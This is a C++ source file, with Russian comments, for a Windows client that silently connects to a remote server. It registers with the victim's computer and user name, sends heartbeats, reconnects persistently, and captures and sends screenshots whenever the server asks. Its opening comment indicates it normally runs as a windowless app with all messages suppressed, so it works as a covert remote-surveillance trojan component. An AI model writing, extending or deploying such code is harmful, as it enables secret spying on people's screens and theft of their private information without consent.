//для деббага нужно убрать комментарии и переключить с WinApp на Console
//!!!!!
//!!!!!
#include "Client.h"
#include "Utils.h"
#include "Screenshot.h"
#include <iostream>
#include <thread>
#include <chrono>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define HEARTBEAT_INTERVAL 30
Client::Client(const std::string& serverIp, int serverPort) : running(false) {
    WSADATA wsData;
    if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
        throw std::runtime_error("Ошибка инициализации Winsock");
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        WSACleanup();
        throw std::runtime_error("Ошибка создания сокета");
    }

    memset(&serverAddress, 0, sizeof(serverAddress));
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(serverPort);
    if (inet_pton(AF_INET, serverIp.c_str(), &serverAddress.sin_addr) <= 0) {
        closesocket(clientSocket);
        WSACleanup();
        throw std::runtime_error("Ошибка преобразования IP-адреса");
    }
}

Client::~Client() {
    closesocket(clientSocket);
    WSACleanup();
}

void Client::connectToServer() {
    while (true) {
        //std::cout << "Попытка подключения к серверу..." << std::endl;

        if (connect(clientSocket, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR) {
            //std::cerr << "Ошибка подключения к серверу. Повтор через 5 секунд..." << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        //std::cout << "Успешное подключение к серверу." << std::endl;
        break;
    }
}

void Client::run() {
    running = true;

    registerToServer();

    std::thread serverThread(&Client::handleServerMessages, this);

    while (running) {
        if (!sendMessage("HEARTBEAT")) {
            handleReconnection();
        }
        std::this_thread::sleep_for(std::chrono::seconds(HEARTBEAT_INTERVAL));
    }

    serverThread.join();
}

bool Client::sendMessage(const std::string& message) {
    std::vector<char> data(message.begin(), message.end());
    return sendMessageWithLength(data);
}

bool Client::sendMessageWithLength(const std::vector<char>& data) {
    int32_t dataLength = static_cast<int32_t>(data.size());
    int32_t dataLengthNetwork = htonl(dataLength);

    if (send(clientSocket, reinterpret_cast<char*>(&dataLengthNetwork), sizeof(dataLengthNetwork), 0) == SOCKET_ERROR) {
        //std::cerr << "Ошибка отправки длины сообщения." << std::endl;
        return false;
    }

    if (send(clientSocket, data.data(), data.size(), 0) == SOCKET_ERROR) {
        //std::cerr << "Ошибка отправки данных." << std::endl;
        return false;
    }

    return true;
}

void Client::handleServerMessages() {
    while (running) {
        int32_t messageLengthNetwork = 0;
        int bytesReceived = recv(clientSocket, reinterpret_cast<char*>(&messageLengthNetwork), sizeof(messageLengthNetwork), 0);

        if (bytesReceived <= 0) {
           // std::cerr << "Соединение с сервером потеряно. Попытка переподключения..." << std::endl;
            handleReconnection();
            break;
        }

        int32_t messageLength = ntohl(messageLengthNetwork);

        // Динамически выделяем буфер для сообщения
        std::vector<char> buffer(messageLength);
        int totalBytesReceived = 0;

        while (totalBytesReceived < messageLength) {
            bytesReceived = recv(clientSocket, buffer.data() + totalBytesReceived, messageLength - totalBytesReceived, 0);

            if (bytesReceived <= 0) {
                //std::cerr << "Ошибка получения данных от сервера." << std::endl;
                handleReconnection();
                return;
            }

            totalBytesReceived += bytesReceived;
        }

        std::string command(buffer.begin(), buffer.end());

        if (command == "SCREENSHOT_REQUEST") {
            //std::cout << "Получен запрос на скриншот." << std::endl;
            std::string screenshotBase64 = Screenshot::capture();
            std::vector<char> data(screenshotBase64.begin(), screenshotBase64.end());

            std::string header = "SCREENSHOT ";
            std::vector<char> message(header.begin(), header.end());
            message.insert(message.end(), data.begin(), data.end());

            sendMessageWithLength(message);
        }
    }
}

void Client::registerToServer() {
    std::string registerMessage = "REGISTER " + Utils::getComputerName() + "|" + Utils::getUserName();
    if (!sendMessage(registerMessage)) {
        //std::cerr << "Ошибка регистрации клиента. Попытка переподключения..." << std::endl;
        handleReconnection();
    }
}

void Client::handleReconnection() {
    running = false;

    closesocket(clientSocket);

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        throw std::runtime_error("Ошибка создания нового сокета при переподключении");
    }

    connectToServer();
    registerToServer();
    running = true;
}
